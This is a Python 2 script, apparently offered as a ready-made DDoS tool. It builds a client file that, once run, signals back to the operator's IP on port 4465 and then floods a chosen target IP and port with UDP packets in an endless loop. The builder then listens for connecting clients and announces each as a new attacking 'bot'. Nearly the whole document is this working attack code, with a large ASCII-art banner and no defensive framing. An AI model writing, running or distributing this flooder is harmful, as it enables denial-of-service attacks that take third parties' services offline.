#Original Program By NSK B3
import sys, socket
help = """
Usage: python ddos_net.py [TARGET] [PORT] [LHOST]
-------------------------------------------|
                                           |
TARGET: Target IP ADDRESS/WEBSITE To Flood |
                                           |
PORT: Target PORT To Send the Packets to   |
                                           |
LHOST: Your Public IP Address              |
with port 4465 forwarded!                  |
___________________________________________|
"""
def cli():
	print """
                                                                                                                                                        
                                                                                                                                                        
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS      NNNNNNNN        NNNNNNNNEEEEEEEEEEEEEEEEEEEEEETTTTTTTTTTTTTTTTTTTTTTT
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S     N:::::::N       N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S     N::::::::N      N::::::NE::::::::::::::::::::ET:::::::::::::::::::::T
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS     N:::::::::N     N::::::NEE::::::EEEEEEEEE::::ET:::::TT:::::::TT:::::T
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::OS:::::S                 N::::::::::N    N::::::N  E:::::E       EEEEEETTTTTT  T:::::T  TTTTTT
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::OS:::::S                 N:::::::::::N   N::::::N  E:::::E                     T:::::T        
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O S::::SSSS              N:::::::N::::N  N::::::N  E::::::EEEEEEEEEE           T:::::T        
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS         N::::::N N::::N N::::::N  E:::::::::::::::E           T:::::T        
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS       N::::::N  N::::N:::::::N  E:::::::::::::::E           T:::::T        
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S      N::::::N   N:::::::::::N  E::::::EEEEEEEEEE           T:::::T        
  D:::::D     D:::::DD:::::D     D:::::DO:::::O     O:::::O            S:::::S     N::::::N    N::::::::::N  E:::::E                     T:::::T        
  D:::::D    D:::::D D:::::D    D:::::D O::::::O   O::::::O            S:::::S     N::::::N     N:::::::::N  E:::::E       EEEEEE        T:::::T        
DDD:::::DDDDD:::::DDDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S     N::::::N      N::::::::NEE::::::EEEEEEEE:::::E      TT:::::::TT      
D:::::::::::::::DD D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S     N::::::N       N:::::::NE::::::::::::::::::::E      T:::::::::T      
D::::::::::::DDD   D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS      N::::::N        N::::::NE::::::::::::::::::::E      T:::::::::T      
DDDDDDDDDDDDD      DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS        NNNNNNNN         NNNNNNNEEEEEEEEEEEEEEEEEEEEEE      TTTTTTTTTTT      
                                                                                                                                                        
                                                                                                                                                        
                                                                                                                                                        
                                                                                                                                                        
                                                                                                                                                        
		 /$$$$$$$$  /$$$$$$   /$$$$$$  /$$     /$$       /$$$$$$$  /$$$$$$$   /$$$$$$   /$$$$$$ 
		| $$_____/ /$$__  $$ /$$__  $$|  $$   /$$/      | $$__  $$| $$__  $$ /$$__  $$ /$$__  $$
		| $$      | $$  \ $$| $$  \__/ \  $$ /$$/       | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/
		| $$$$$   | $$$$$$$$|  $$$$$$   \  $$$$/        | $$  | $$| $$  | $$| $$  | $$|  $$$$$$ 
		| $$__/   | $$__  $$ \____  $$   \  $$/         | $$  | $$| $$  | $$| $$  | $$ \____  $$
		| $$      | $$  | $$ /$$  \ $$    | $$          | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$
		| $$$$$$$$| $$  | $$|  $$$$$$/    | $$          | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/
		|________/|__/  |__/ \______/     |__/          |_______/ |_______/  \______/  \______/ 

                                                                                        
                                                                                        


"""
	global target, port, lhost, LPORT
	try:
		target = sys.argv[1]
		port = sys.argv[2]
		lhost = sys.argv[3]
		LPORT = 4465
	except:
		print(help)
		quit()
cli()
code = """
import socket
class Client:
	def __init__(self, socket, signal):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		self.signal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	@classmethod
	def send_signal(self):
		self.signal = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.signal.connect(('{0}', {1}))
		self.signal.close()
	@classmethod
	def send_attack(self, target):
		self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		print('Loading.. This process might take 10-30 minutes!')
		while True:
			self.socket.sendto('request', ('{2}', {3}))
\n""".format(lhost, LPORT, target, port)

codesecond = """
def launch():
	Client.send_signal()
	Client.send_attack('%s')
launch()
""" % target
FULL_CODE = code + codesecond

def create_file():
	name = raw_input("Name Of The Client File: ")
	if '.py' not in name:
		print("The Client file must end with .py!")
		quit()
	f = open(name, "w")
	f.write(FULL_CODE)
	print "%s Created" % name
def listen():
	f = 0
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			conn.close()
		except:
			pass
		s.bind(("", LPORT))
		s.listen(100000)
		print "Listening..."
		try:
			conn, addr = s.accept()
		except:
			pass
		f += 1
		sys.stdout.write("\rA New Bot Has Started Attacking!\n")
		sys.stdout.flush()

create_file()
listen()
